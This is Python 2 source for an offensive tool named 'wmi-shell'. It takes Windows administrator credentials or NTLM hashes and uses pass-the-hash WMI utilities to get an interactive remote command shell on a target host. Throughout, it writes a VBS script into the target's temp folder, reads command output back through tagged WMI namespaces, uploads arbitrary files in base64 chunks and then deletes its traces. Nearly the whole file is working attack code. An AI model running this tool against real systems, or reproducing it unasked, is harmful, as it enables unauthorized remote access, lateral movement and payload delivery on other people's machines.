#!/usr/bin/python
#   Copyright (c) 2013 Andrei Dumitrescu for LEXSI  
#
#   This program is free software: you can redistribute it and/or modify
#   it under the terms of the GNU General Public License as published by
#   the Free Software Foundation, either version 3 of the License, or
#   (at your option) any later version.
#
#   This program is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#   GNU General Public License for more details.
#
#   You should have received a copy of the GNU General Public License
#   along with this program.  If not, see <https://www.gnu.org/licenses/>.


from subprocess import call
import tempfile
import time
import re
import os
import sys
import random
import string
import base64
import readline

if (len(sys.argv) < 4): 
    print "\nUsage: \n\tpython -O wmi-shell.py   <admin_name>   <admin_pass> OR <admin_hash like LM:NTLM>   <target_IP>\n" 
    print "Incorrect number of arguments... exiting!\n"
    sys.exit(0)

ADMIN_USER = sys.argv[1]
ADMIN_PASS = sys.argv[2]
TARGET_HOST = sys.argv[3]
SCRIPT_NAME = ""
READ_DELAY = 1.5
TAG = "EVILTAG"
TAG_TEMPLATE = "EVILTAG000000"
MY_PADDING = "        "
LINE_LENGTH = 4500
UPLOAD_FLAG = 0
#WMIC = "./bin/wmic"            #not working anymore, missing libraries 
#WMIS = "./bin/wmis"            #same

#On Kali Linux 32 or 64bit with Pass-The-Hash Toolkit installed
WMIC = "pth-wmic" 
WMIS = "pth-wmis"


def shell_cmd(cmd_string):
    try:
        err_code = call(cmd_string, shell=True)
        if __debug__:
            print "Executed command -->  ",cmd_string," <-- . Returned code: ",err_code
    except OSError as e:
        print "Execution FAILED for command -->  ",cmd_string," <-- . Returned code: ",e
        pass

def exec_cmd(command):

## executing commands on the TARGET_HOST using the modified version of './bin/wmis' or 'wmis' (from Kali) or 'pth-wmis'
    cmd_string = WMIS + " -U \"" + ADMIN_USER + "\"%\"" + ADMIN_PASS + "\" //" + TARGET_HOST + " \"cmd /c " + command + "\" 2>/dev/null"
## for some unknown reason this call() might take a long time (~10 sec) to start...
    shell_cmd(cmd_string)

def read_cmd_output():

    random_name = ''.join(random.sample(string.letters + string.digits, 7))

## waiting for the command output to be inserted into the WMI DB

    ready_file = random_name + "_ready.tmp"
    cmd_string = WMIC + " -U \"" + ADMIN_USER + "\"%\"" + ADMIN_PASS + "\" //" + TARGET_HOST + " --namespace='root\default' \"select Name from __Namespace where Name like 'DOWNLOAD_READY'\" > " + ready_file
    shell_cmd(cmd_string)
    f = open(ready_file,"r") 
    ready = 0
    print "waiting for command output . .",
    while not ready:
	shell_cmd(cmd_string)
	if "DOWNLOAD_READY" in f.read(): ready = 1
	f.seek(0,0)
	time.sleep(0.5)
	print ".",
    f.close()
    os.unlink(ready_file)
    print " done !"  

## the command output is READY and is present in the WMI DB

    tempfile = random_name + ".tmp"
    cmd_string = WMIC + " -U \"" + ADMIN_USER + "\"%\"" + ADMIN_PASS + "\" //" + TARGET_HOST + " --namespace='root\default' \"select Name from __Namespace where Name like 'EVILTAG%'\" > " + tempfile 
    shell_cmd(cmd_string)
    
## saving the tempfile's contents in an array of lines

    f = open(tempfile,"r") 
    lines = list(f)
    f.close()
    os.unlink(tempfile)

    lines = filter(lambda elem: elem[:len(TAG)] == TAG, lines)
    lines = sorted(lines, key = lambda elem: elem[:len(TAG_TEMPLATE)])
    final_output = ""
    for line in lines:
	line = line[len(TAG_TEMPLATE):]

        pattern = re.compile('\\n')
    	line = pattern.sub("",line)
	
	## my Unicode-Fu in Python
	## 1. "Decode first": (from UTF-8 to Unicode)
	line = line.decode("utf-8")

	## 2. "Do stuff": set up regex looking for Unicode code points
	pattern = re.compile(ur"[\u0080-\uffef]", re.UNICODE)
	
	## replace Unicode code points with my favourite char
    	line = pattern.sub('+',line)
	
	## 3. "Encode at the end": encode back to UTF-8 at the end
	line.encode("utf-8")

        pattern = re.compile('_')
	line = pattern.sub('/',line)

	## putting the required base64 padding 
	line += '=' * (-len(line) % 4) 
		
	line = base64.b64decode(line)
	line = line[len(MY_PADDING):]
	line = line[:-len(MY_PADDING)]
	
	final_output += line.strip()

    print final_output

    exec_cmd("cscript %TEMP%\\" + SCRIPT_NAME + " \\\"" + "cleanup" + "\\\"")
	
def cleanup():

    exec_cmd("del" + " %TEMP%\\" + SCRIPT_NAME)
    exec_cmd("del" + " %TEMP%\\" + "TempWmicBatchFile.bat")
    exec_cmd("del" + " %TEMP%\\" + "ENCODED")
    exec_cmd("del" + " %TEMP%\\" + "base64.exe")
    print "All is clean on TARGET_HOST."

def send_VBS_script():

    global SCRIPT_NAME 
    SCRIPT_NAME = ''.join(random.sample(string.letters + string.digits, 7)) + ".vbs"

    print "Sending our VBS script to ",TARGET_HOST," ETA: ~6.4 seconds."

    f = open("base.vbs","r")
    for line in f:
	
	## removing newline character
	line = line.rstrip()

	## replace each \ with \\ for Bash
	line = line.replace("\\",r'\\')

	## replace " with \" for Bash
	line = line.replace("\"","\\\"")

	exec_cmd("echo " + line + " >>%TEMP%\\" + SCRIPT_NAME)
	time.sleep(0.1)

def basic_upload(filename):

    try:
	exec_cmd("del" + " %TEMP%\\" + "ENCODED")

        f1 = open(filename,"rb")
        data = f1.read()
	f1.close()

	data = base64.b64encode(data)
	data_len = len(data)
	
	print "Upload time remaining: " + str(os.path.getsize(filename) / LINE_LENGTH) + " seconds."

	for chunk in [data[i:i+LINE_LENGTH] for i in range(0, data_len, LINE_LENGTH)]:
            exec_cmd("echo " + chunk + " >>%TEMP%\\ENCODED")
	    time.sleep(1)  

    except IOError as e:
        print "Exception: ",e

def upload(filename):
	
	global UPLOAD_FLAG

	if not UPLOAD_FLAG:
	    print "Uploading an efficient Base64 tool"
	    basic_upload("./bin/base64.exe")
	    exec_cmd("cscript %TEMP%\\" + SCRIPT_NAME + " \\\"decode_tool\\\"")
	    UPLOAD_FLAG = 1

	print "Uploading " + filename
	basic_upload(filename)	
	exec_cmd("%TEMP%\\" + "base64.exe -d -i " + "%TEMP%\\" + "ENCODED -o " + "%TEMP%\\" + os.path.basename(filename))	

send_VBS_script()

while 1:
   try:
	command = raw_input(">>> ")
	pattern_upload = re.compile("upload (\S+)\s*")
	match1 = re.search(pattern_upload, command)
        if not command: 
            print ""
            print "Enter a Windows command OR upload <filename>"
            print "WARNING: uploaded files must be cleaned by you"
            print ""
            print "CTRL+D for nice exit"
            print ""
        elif (match1): 
            upload(match1.group(1))
	else: 
	    exec_cmd("cscript %TEMP%\\" + SCRIPT_NAME + " \\\"" + command + "\\\"")
	    read_cmd_output()
   except EOFError as e:
	print "Nothing in excess"
	cleanup()
	sys.exit(0)

